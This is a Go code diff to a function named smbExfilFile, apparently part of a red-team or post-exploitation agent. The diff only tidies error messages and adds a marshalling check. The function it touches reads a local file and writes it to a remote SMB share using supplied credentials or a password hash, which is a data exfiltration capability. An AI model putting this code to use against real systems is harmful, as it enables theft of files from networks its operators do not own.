@@ -27,10 +27,10 @@ func smbExfilFile(args smbArgs) structs.CommandResult {
 	// Read local file
 	data, err := os.ReadFile(args.Source)
 	if err != nil {
-		return errorf("Error reading source file: %v", err)
+		return errorf("reading source file: %v", err)
 	}
 	if len(data) == 0 {
-		return errorResult("Error: source file is empty")
+		return errorResult("source file is empty")
 	}
 
 	// Generate random filename if path not specified
@@ -48,7 +48,7 @@ func smbExfilFile(args smbArgs) structs.CommandResult {
 	// Connect to SMB
 	session, conn, err := smbDialSession(args.Host, args.Port, args.Username, args.Domain, args.Password, args.Hash, smbOperationTimeout)
 	if err != nil {
-		return errorf("Error connecting to %s: %v", args.Host, err)
+		return errorf("connecting to %s: %v", args.Host, err)
 	}
 	sc := &smbConn{session: session, conn: conn}
 	defer sc.close()
@@ -57,7 +57,7 @@ func smbExfilFile(args smbArgs) structs.CommandResult {
 	sc.setDeadline(smbOperationTimeout)
 	share, err := sc.session.Mount(fmt.Sprintf(`\\%s\%s`, args.Host, args.Share))
 	if err != nil {
-		return errorf("Error mounting share %s: %v", args.Share, err)
+		return errorf("mounting share %s: %v", args.Share, err)
 	}
 	defer func() { _ = share.Umount() }()
 
@@ -65,13 +65,13 @@ func smbExfilFile(args smbArgs) structs.CommandResult {
 	sc.setDeadline(smbOperationTimeout)
 	f, err := share.Create(remotePath)
 	if err != nil {
-		return errorf("Error creating remote file %s: %v", remotePath, err)
+		return errorf("creating remote file %s: %v", remotePath, err)
 	}
 
 	_, err = f.Write(data)
 	f.Close()
 	if err != nil {
-		return errorf("Error writing to remote file: %v", err)
+		return errorf("writing to remote file: %v", err)
 	}
 
 	result := smbExfilResult{
@@ -83,6 +83,9 @@ func smbExfilFile(args smbArgs) structs.CommandResult {
 		Success:    true,
 	}
 
-	output, _ := json.Marshal(result)
+	output, err := json.Marshal(result)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
+	}
 	return successResult(string(output))
 }
